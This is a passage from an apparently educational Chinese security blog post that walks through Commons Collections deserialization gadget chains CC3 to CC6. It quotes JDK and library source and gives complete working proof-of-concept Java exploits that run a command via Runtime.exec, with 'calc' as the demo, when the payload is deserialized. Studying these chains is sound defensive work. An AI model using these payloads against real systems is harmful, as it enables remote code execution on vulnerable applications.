<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> ((Class)input).getConstructor(<span class="built_in">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> con.newInstance(<span class="built_in">this</span>.iArgs);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: The constructor must exist and be public &quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: InstantiationException&quot;</span>, ex);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: Constructor must be public&quot;</span>, ex);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: Constructor threw an exception&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>思路出来了，先获取<code>TrAXFilter</code>类的构造器，再把<code>templatesTmpl</code>传入作为参数，为了达成这一目的，需要使用<code>ChainedTransformed</code>的链式调用</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesTmpl&#125;)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>后面则是LazyMap的路径了，如此整条链已经完成</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3TrAXFilter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">test</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> test.makeClassInitializer();</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">        test.setSuperclass(superClass);</span><br><span class="line">        <span class="type">byte</span>[] bytecode = test.toBytecode();</span><br><span class="line">        </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templatesImpl.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span>  templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templatesImpl, <span class="string">&quot;any&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span>  templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templatesImpl, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span>  templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templatesImpl, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">Constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        Constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">annotationInvocationHandler</span> <span class="operator">=</span> (InvocationHandler) Constructor.newInstance(Override.class,lazyMap);</span><br><span class="line">        Map&lt;?,?&gt; proxyMap =(Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, annotationInvocationHandler);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">annotationInvocationHandler2</span> <span class="operator">=</span> (InvocationHandler) Constructor.newInstance(Override.class,proxyMap);</span><br><span class="line">        </span><br><span class="line">        serialize(annotationInvocationHandler2);</span><br><span class="line">        unserialize(<span class="string">&quot;cc3.ser&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;cc3.ser&quot;</span>)));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(filename)));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><h2 id="CommonsCollections4反序列化链"><a href="#CommonsCollections4反序列化链" class="headerlink" title="CommonsCollections4反序列化链"></a>CommonsCollections4反序列化链</h2><p>CC4链与CC3同样使用<code>TrAXFilter</code>去触发<code>newTransformer()</code>方法，不同之处在于该链的起点是<code>PriorityQueue</code>，前半段与CC2大体相同，但是由于不直接使用<code>invokerTransformer</code>去调用<code>newTransformer()</code>，<code>queue[]</code>数组内可以是任意值</p><p><code>PriorityQueue</code>的构建</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(transformingComparator);</span><br><span class="line"><span class="type">Class</span> <span class="variable">priorityQueueClass</span> <span class="operator">=</span> priorityQueue.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">queue</span> <span class="operator">=</span> priorityQueueClass.getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">queue.setAccessible(<span class="literal">true</span>);</span><br><span class="line">queue.set(priorityQueue, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;anything&quot;</span>,<span class="string">&quot;anything&quot;</span>&#125;);</span><br><span class="line"><span class="type">Field</span> <span class="variable">size</span> <span class="operator">=</span> priorityQueueClass.getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">size.setAccessible(<span class="literal">true</span>);</span><br><span class="line">size.set(priorityQueue, <span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>与CC3的后半段结合就是完整的链了</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">test</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> test.makeClassInitializer();</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">        test.setSuperclass(superClass);</span><br><span class="line">        <span class="type">byte</span>[] bytecode = test.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;any&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(transformingComparator);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">priorityQueueClass</span> <span class="operator">=</span> priorityQueue.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">queue</span> <span class="operator">=</span> priorityQueueClass.getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        queue.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        queue.set(priorityQueue, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;anything&quot;</span>,<span class="string">&quot;anything&quot;</span>&#125;);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">size</span> <span class="operator">=</span> priorityQueueClass.getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">        size.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        size.set(priorityQueue, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;cc3.ser&quot;</span>)));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(<span class="string">&quot;cc3.ser&quot;</span>)));</span><br><span class="line">        ois.readObject();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><h2 id="CommonsCollections5反序列化链"><a href="#CommonsCollections5反序列化链" class="headerlink" title="CommonsCollections5反序列化链"></a>CommonsCollections5反序列化链</h2><p>CC5链的后半段与CC1类似，使用<code>ChainedTransformer</code>和<code>LazyMap</code>，不同之处在于触发<code>get()</code>方法的上层是<code>TiedMapEntry</code>类的<code>getValue()</code>方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.map.get(<span class="built_in">this</span>.key);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>往上查找发现同类的<code>toString()</code>调用<code>getValue()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.getKey() + <span class="string">&quot;=&quot;</span> + <span class="built_in">this</span>.getValue();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>该方法的上层是<code>BadAttributeValueExpException</code>的<code>readObject()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">            val = <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            val= valObj;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span></span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">            val = valObj.toString();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">            val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>想办法让<code>BadAttributeValueExpException</code>的<code>val</code>为<code>TiedMapEntry</code>的对象就好了，在构造器中</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">BadAttributeValueExpException</span> <span class="params">(Object val)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.val = val == <span class="literal">null</span> ? <span class="literal">null</span> : val.toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>发现如果直接用构造器赋值，会直接在实例化阶段把<code>val</code>赋值为<code>TiedMapEntry.toString()</code>后的字符串，这会导致反序列化时进入<code>readObject()</code>的第一个else if而不是预期的第二个else if，故在构造时我们需要传入<code>null</code>，后面再通过反射直接把<code>val</code>赋值为<code>TiedMapEntry</code>对象</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> badAttributeValueExpException.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">val.set(badAttributeValueExpException,tiedMapEntry);</span><br></pre></td></tr></table></figure><p>前面就是CC1的东西了，组合得到完整链</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map,chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> badAttributeValueExpException.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException,tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        serialize(badAttributeValueExpException);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;cc5.ser&quot;</span>)));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(<span class="string">&quot;cc5.ser&quot;</span>)));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><h2 id="CommonsCollections6反序列化链"><a href="#CommonsCollections6反序列化链" class="headerlink" title="CommonsCollections6反序列化链"></a>CommonsCollections6反序列化链</h2><p>该链的后半段与CC5相同，不同在于触发<code>tiedMapEntry</code>的<code>getValue()</code>上层方法是<code>hashCode()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.getValue();</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">this</span>.getKey() == <span class="literal">null</span> ? <span class="number">0</span> : <span class="built_in">this</span>.getKey().hashCode()) ^ (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>HashMap</code>类的<code>hash()</code>方法有调用<code>hashcode()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="type">int</span> h;</span><br><span class="line">        <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>有个条件是<code>key</code>不为空，这个条件后面会用到。调用<code>hashcode()</code>就在<code>HashMap</code>类的<code>readObject()</code>里</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        reinitialize();</span><br><span class="line">        <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                             loadFactor);</span><br><span class="line">        s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">        <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                             mappings);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line">            <span class="comment">// Size the table using given load factor only if within</span></span><br><span class="line">            <span class="comment">// range of 0.25...4.0</span></span><br><span class="line">            <span class="type">float</span> <span class="variable">lf</span> <span class="operator">=</span> Math.min(Math.max(<span class="number">0.25f</span>, loadFactor), <span class="number">4.0f</span>);</span><br><span class="line">            <span class="type">float</span> <span class="variable">fc</span> <span class="operator">=</span> (<span class="type">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">cap</span> <span class="operator">=</span> ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                       DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                       (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                       MAXIMUM_CAPACITY :</span><br><span class="line">                       tableSizeFor((<span class="type">int</span>)fc));</span><br><span class="line">            <span class="type">float</span> <span class="variable">ft</span> <span class="operator">=</span> (<span class="type">float</span>)cap * lf;</span><br><span class="line">            threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                         (<span class="type">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line">            <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">                Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>[cap];</span><br><span class="line">            table = tab;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">                putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在<code>HashSet</code>的<code>readObject()</code>中，可以对反序列化的<code>map</code>字段调用<code>readObject()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// Read in any hidden serialization magic</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read 